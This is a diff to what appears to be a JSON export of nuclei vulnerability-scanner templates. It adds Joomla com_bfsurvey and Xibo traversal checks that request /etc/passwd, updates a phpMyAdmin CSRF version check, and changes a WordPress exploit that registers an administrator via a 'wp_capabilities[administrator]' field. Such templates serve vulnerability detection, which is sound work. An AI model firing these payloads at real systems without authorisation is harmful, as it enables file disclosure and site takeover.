@@ -558,6 +558,40 @@
       ]
     },
     {
+      "id": "CVE-2010-2259",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the BF Survey (com_bfsurvey) component for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component com_bfsurvey - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/10946\n- https://www.cvedetails.com/cve/CVE-2010-2259\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-2307",
       "info": {
         "author": "daffainfo",
@@ -2166,6 +2200,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/ccmadmin/bulkvivewfilecontents.do?filetype=samplefile&fileName=../../../../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2013-5979",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in Spring Signage Xibo 1.2.x before 1.2.3 and 1.4.x before 1.4.2 allows remote attackers to read arbitrary files via a .. (dot dot) in the p parameter to index.php.",
+        "name": "Xibo 1.2.2/1.4.1 - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/26955\n- https://www.cvedetails.com/cve/CVE-2013-5979\n- https://bugs.launchpad.net/xibo/+bug/1093967\n",
+        "severity": "high",
+        "tags": "cve,cve2013,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?p=../../../../../../../../../../../../../../../../etc/passwd%00index&q=About&ajax=true&_=1355714673828"
           ]
         }
       ]
@@ -9910,7 +9978,7 @@
     {
       "id": "CVE-2019-12616",
       "info": {
-        "author": "Mohammedsaneem",
+        "author": "Mohammedsaneem,philippedelteil",
         "description": "A vulnerability was found that allows an attacker to trigger a CSRF attack against a phpMyAdmin user. The attacker can trick the user, for instance through a broken <img> tag pointing at the victim's phpMyAdmin database, and the attacker can potentially deliver a payload (such as a specific INSERT or DELETE statement) through the victim.",
         "name": "phpMyAdmin CSRF",
         "reference": "- https://www.phpmyadmin.net/security/PMASA-2019-4/\n- https://www.exploit-db.com/exploits/46982\n- https://nvd.nist.gov/vuln/detail/CVE-2019-12616\n",
@@ -9919,18 +9987,35 @@
       },
       "requests": [
         {
+          "extractors": [
+            {
+              "group": 1,
+              "part": "body",
+              "regex": [
+                "v=([a-z0-9-._]+)"
+              ],
+              "type": "regex"
+            }
+          ],
           "matchers": [
             {
-              "condition": "and",
               "type": "word",
               "words": [
-                "4.6.6deb4+deb9u2",
                 "phpMyAdmin"
               ]
             },
             {
+              "condition": "or",
+              "regex": [
+                "v=([1-4]\\.[0-8].*)",
+                "v=4.9.0.1"
+              ],
+              "type": "regex"
+            },
+            {
               "status": [
-                200
+                200,
+                401
               ],
               "type": "status"
             }
@@ -22074,7 +22159,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "welcome-panel"
+                "Welcome to your WordPress Dashboard"
               ]
             },
             {
@@ -22087,10 +22172,9 @@
           "matchers-condition": "and",
           "raw": [
             "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0\nAccept: application/json, text/javascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------138742543134772812001999326589\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\nConnection: close\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_username\"\n\n{{randstr}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_email\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password_present\"\n\ntrue\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_first_name\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_last_name\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"_wp_http_referer\"\n\n/wp/?page_id=18\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"pp_current_url\"\n\n{{BaseURL}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"wp_capabilities[administrator]\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_form_id\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_referrer_page\"\n\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"action\"\n\npp_ajax_signup\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"melange_id\"\n\n\n-----------------------------138742543134772812001999326589--\n",
-            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\nConnection: close\n\naction=pp_ajax_login&data=login_username={{randstr}}@example.com&login_password={{randstr}}@example.com\n",
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\nConnection: close\n\nlog={{randstr}}@example.com&pwd={{randstr}}@example.com&wp-submit=Log+In\n",
             "GET /wp-admin/ HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: close\n"
-          ],
-          "redirects": true
+          ]
         }
       ]
     },
